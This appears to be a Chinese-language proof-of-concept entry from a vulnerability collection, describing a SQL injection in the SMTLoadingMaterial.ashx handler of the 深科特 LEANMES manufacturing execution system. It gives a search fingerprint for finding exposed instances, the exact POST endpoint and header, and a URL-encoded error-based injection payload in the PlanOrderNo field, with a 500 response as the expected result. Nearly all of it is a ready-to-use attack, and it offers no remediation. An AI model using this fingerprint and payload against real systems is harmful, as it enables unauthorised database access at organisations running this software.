# 深科特LEANMES系统SMTLoadingMaterial.ashx存在SQL注入漏洞

- **系统**：深科特LEANMES系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`POST /handler/SMTLoadingMaterial.ashx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
type=GetOrderList&PlanOrderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289304%3D9304%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+keHv
```
- **预期**：500　|　—